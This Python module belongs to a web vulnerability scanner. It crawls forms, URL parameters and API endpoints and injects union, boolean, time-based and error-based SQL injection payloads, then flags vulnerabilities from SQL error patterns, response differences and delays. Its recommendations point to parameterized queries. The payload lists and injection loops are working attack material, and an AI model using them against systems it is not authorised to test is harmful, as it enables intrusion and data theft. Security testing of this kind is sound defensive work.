"""
SQL Injection Testing
Tests for SQL injection vulnerabilities
"""

import asyncio
from typing import List, Dict
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
from loguru import logger

from core.models import TestContext, Severity
from .base_security_test import BaseSecurityTest


class SQLInjectionTest(BaseSecurityTest):
    """
    SQL Injection Test
    Tests for various types of SQL injection vulnerabilities
    """

    name = "sql_injection"
    description = "Tests for SQL injection vulnerabilities (Union, Boolean, Time-based, Error-based)"
    config_key = "sql_injection"

    # SQL Injection payloads for different techniques
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "1' UNION SELECT NULL,table_name FROM information_schema.tables--",
    ]

    BOOLEAN_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "1' OR '1'='1",
    ]

    TIME_BASED_PAYLOADS = [
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    ERROR_BASED_PAYLOADS = [
        "'",
        "''",
        "' OR 1=1--",
        "' OR '1",
        "' AND '1'='2",
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,database()))--",
    ]

    # SQL error patterns
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL.*Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"SqlClient\.",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLite\/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_.*",
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_.*",
        r"quoted string not properly terminated",
    ]

    async def run_test(self, context: TestContext) -> None:
        """Run SQL injection tests"""

        # Get all forms and URL parameters from crawled pages
        test_targets = []

        # Test forms
        for page in context.crawled_pages:
            for form in page.forms:
                if form.get('inputs'):
                    test_targets.append({
                        'type': 'form',
                        'url': form.get('action') or page.url,
                        'method': form.get('method', 'GET'),
                        'inputs': form.get('inputs', [])
                    })

        # Test URL parameters
        for page in context.crawled_pages:
            parsed = urlparse(page.url)
            if parsed.query:
                params = parse_qs(parsed.query)
                if params:
                    test_targets.append({
                        'type': 'url_param',
                        'url': page.url,
                        'method': 'GET',
                        'params': params
                    })

        # Also test API endpoints
        for endpoint in context.api_endpoints:
            test_targets.append({
                'type': 'api',
                'url': endpoint.url,
                'method': endpoint.method,
                'params': {p['name']: p.get('value', 'test') for p in endpoint.parameters}
            })

        logger.info(f"Testing {len(test_targets)} targets for SQL injection")

        # Test each target
        tasks = []
        for target in test_targets[:50]:  # Limit to first 50 to avoid too many requests
            tasks.append(self._test_target(target, context))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_target(self, target: Dict, context: TestContext) -> None:
        """
        Test a specific target for SQL injection

        Args:
            target: Target information (form, URL param, or API endpoint)
            context: Test context
        """
        url = target['url']
        method = target['method'].upper()

        # Get test types from config
        test_types = self.get_config_value('test_types', ['union', 'boolean', 'time', 'error'])

        # Test different SQL injection techniques
        if 'error' in test_types:
            await self._test_error_based(url, method, target, context)

        if 'boolean' in test_types:
            await self._test_boolean_based(url, method, target, context)

        if 'union' in test_types:
            await self._test_union_based(url, method, target, context)

        if 'time' in test_types:
            await self._test_time_based(url, method, target, context)

    async def _test_error_based(self, url: str, method: str, target: Dict, context: TestContext) -> None:
        """Test for error-based SQL injection"""

        for payload in self.ERROR_BASED_PAYLOADS:
            try:
                # Inject payload into parameters
                if target['type'] == 'form':
                    data = {inp['name']: payload for inp in target.get('inputs', []) if inp.get('name')}
                    response = await self.make_request(url, method=method, data=data)
                else:
                    params = target.get('params', {})
                    # Test each parameter
                    for param_name in params:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        if method == 'GET':
                            test_url = f"{url.split('?')[0]}?{urlencode(test_params, doseq=True)}"
                            response = await self.make_request(test_url, method='GET')
                        else:
                            response = await self.make_request(url, method=method, data=test_params)

                        # Check for SQL errors in response
                        if self._check_sql_errors(response.text):
                            self.add_finding(
                                title="SQL Injection Vulnerability (Error-based)",
                                description=f"SQL injection vulnerability detected using error-based technique. "
                                          f"The parameter '{param_name}' appears to be vulnerable to SQL injection. "
                                          f"Database errors were triggered by malicious SQL payload.",
                                severity=Severity.CRITICAL,
                                url=url,
                                evidence=[
                                    self.create_evidence(
                                        "request",
                                        f"{method} {url}\nPayload: {payload}",
                                        "Request that triggered SQL error"
                                    ),
                                    self.create_evidence(
                                        "response",
                                        response.text[:1000],
                                        "Response containing SQL error"
                                    )
                                ],
                                recommendations=[
                                    self.create_recommendation(
                                        "Use Parameterized Queries",
                                        "Always use parameterized queries or prepared statements instead of "
                                        "concatenating user input directly into SQL queries.",
                                        references=[
                                            "https://owasp.org/www-community/attacks/SQL_Injection",
                                            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                        ],
                                        code_example="# Good (Parameterized)\ncursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))\n\n# Bad (Concatenated)\ncursor.execute(f'SELECT * FROM users WHERE id = {user_id}')"
                                    )
                                ],
                                cwe_id="CWE-89",
                                owasp_category="A03:2021-Injection",
                                parameter=param_name,
                                payload=payload
                            )
                            return  # Found vulnerability, no need to continue

            except Exception as e:
                logger.debug(f"Error testing error-based SQLi on {url}: {str(e)}")

    async def _test_boolean_based(self, url: str, method: str, target: Dict, context: TestContext) -> None:
        """Test for boolean-based blind SQL injection"""

        for payload in self.BOOLEAN_PAYLOADS[:5]:  # Limit payloads
            try:
                if target['type'] == 'form':
                    data = {inp['name']: payload for inp in target.get('inputs', []) if inp.get('name')}
                    response = await self.make_request(url, method=method, data=data)

                    # Get baseline response
                    baseline_data = {inp['name']: 'normal' for inp in target.get('inputs', []) if inp.get('name')}
                    baseline = await self.make_request(url, method=method, data=baseline_data)

                    # Compare responses
                    if self._responses_differ_significantly(baseline, response):
                        self.add_finding(
                            title="Possible SQL Injection Vulnerability (Boolean-based)",
                            description="The application shows different behavior when SQL payloads are injected, "
                                      "suggesting a potential boolean-based blind SQL injection vulnerability.",
                            severity=Severity.HIGH,
                            url=url,
                            cwe_id="CWE-89",
                            owasp_category="A03:2021-Injection",
                            payload=payload
                        )

            except Exception as e:
                logger.debug(f"Error testing boolean-based SQLi: {str(e)}")

    async def _test_union_based(self, url: str, method: str, target: Dict, context: TestContext) -> None:
        """Test for UNION-based SQL injection"""

        for payload in self.UNION_PAYLOADS[:3]:  # Limit payloads
            try:
                params = target.get('params', {})
                for param_name in params:
                    test_params = params.copy()
                    test_params[param_name] = payload

                    if method == 'GET':
                        test_url = f"{url.split('?')[0]}?{urlencode(test_params, doseq=True)}"
                        response = await self.make_request(test_url, method='GET')
                    else:
                        response = await self.make_request(url, method=method, data=test_params)

                    # Check for SQL errors or UNION output
                    if self._check_union_injection(response.text):
                        self.add_finding(
                            title="SQL Injection Vulnerability (UNION-based)",
                            description=f"UNION-based SQL injection detected in parameter '{param_name}'.",
                            severity=Severity.CRITICAL,
                            url=url,
                            cwe_id="CWE-89",
                            owasp_category="A03:2021-Injection",
                            parameter=param_name,
                            payload=payload
                        )

            except Exception as e:
                logger.debug(f"Error testing UNION-based SQLi: {str(e)}")

    async def _test_time_based(self, url: str, method: str, target: Dict, context: TestContext) -> None:
        """Test for time-based blind SQL injection"""

        import time

        for payload in self.TIME_BASED_PAYLOADS[:2]:  # Very limited due to time delay
            try:
                params = target.get('params', {})
                for param_name in params:
                    test_params = params.copy()
                    test_params[param_name] = payload

                    start_time = time.time()

                    if method == 'GET':
                        test_url = f"{url.split('?')[0]}?{urlencode(test_params, doseq=True)}"
                        response = await self.make_request(test_url, method='GET')
                    else:
                        response = await self.make_request(url, method=method, data=test_params)

                    elapsed = time.time() - start_time

                    # If response took significantly longer (>4 seconds for 5 second delay)
                    if elapsed > 4:
                        self.add_finding(
                            title="SQL Injection Vulnerability (Time-based Blind)",
                            description=f"Time-based blind SQL injection detected. The application delayed "
                                      f"response by {elapsed:.2f} seconds when payload was injected.",
                            severity=Severity.CRITICAL,
                            url=url,
                            cwe_id="CWE-89",
                            owasp_category="A03:2021-Injection",
                            parameter=param_name,
                            payload=payload,
                            response_time=elapsed
                        )

            except Exception as e:
                logger.debug(f"Error testing time-based SQLi: {str(e)}")

    def _check_sql_errors(self, response_text: str) -> bool:
        """
        Check if response contains SQL error messages

        Args:
            response_text: HTTP response text

        Returns:
            True if SQL errors found
        """
        import re
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _check_union_injection(self, response_text: str) -> bool:
        """
        Check if UNION injection was successful

        Args:
            response_text: HTTP response text

        Returns:
            True if UNION injection succeeded
        """
        # Look for typical UNION injection indicators
        indicators = ['NULL', 'information_schema', 'table_name']
        return any(ind in response_text for ind in indicators)

    def _responses_differ_significantly(self, response1, response2) -> bool:
        """
        Check if two responses differ significantly

        Args:
            response1: First response
            response2: Second response

        Returns:
            True if responses differ significantly
        """
        # Simple heuristic: different status codes or significantly different content length
        if response1.status_code != response2.status_code:
            return True

        len_diff = abs(len(response1.text) - len(response2.text))
        return len_diff > 100  # More than 100 characters difference
